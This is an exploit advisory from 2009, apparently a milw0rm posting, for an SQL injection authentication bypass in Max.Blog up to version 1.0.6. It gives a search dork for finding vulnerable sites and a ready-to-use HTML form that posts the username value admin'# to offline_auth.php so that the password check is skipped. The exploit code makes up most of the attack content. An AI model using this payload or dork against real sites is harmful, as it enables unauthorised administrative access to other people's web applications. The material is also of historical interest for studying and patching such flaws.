@@ -1,0 +1,54 @@
+###################             Salvatore "drosophila" Fresta
+###################
+
+
+Application:    Max.Blog
+                               http://www.mzbservices.com
+Version:                Max.Blog <= 1.0.6
+Bug:            * Offline Authentication Bypass
+Exploitation:   Remote
+Dork:                   intext:"Powered by Max.Blog"
+Date:           27 Jan 2009
+Discovered by:  Salvatore "drosophila" Fresta
+Author:         Salvatore "drosophila" Fresta
+                       e-mail: drosophilaxxx@gmail.com
+
+
+############################################################################
+
+- BUGS
+
+Offline Authentication Bypass Exploit:
+
+       Requisites: magic quotes = off
+
+       File affected: offline_auth.php
+
+       This bug allows a guest to bypass an offline authentication service
+       using SQL Injection vulnerability.
+
+############################################################################
+
+- CODE
+
+<html>
+       <head>
+               <title>
+                       Salvatore "drosophila" Fresta - Max.Blog <= 1.0.6 Offline
+Authentication Bypass Exploit
+               </title>
+       </head>
+       <body>
+               <form
+action="http://www.site.com/path/offline_auth.php" method="POST">
+                       <input type="text" name="username"
+value="admin'#" size="15">
+                       <input type="hidden" name="password">
+                       <input type="submit" value="Go!">
+               </form>
+       </body>
+</html>
+
+############################################################################
+
+# milw0rm.com [2009-01-28]
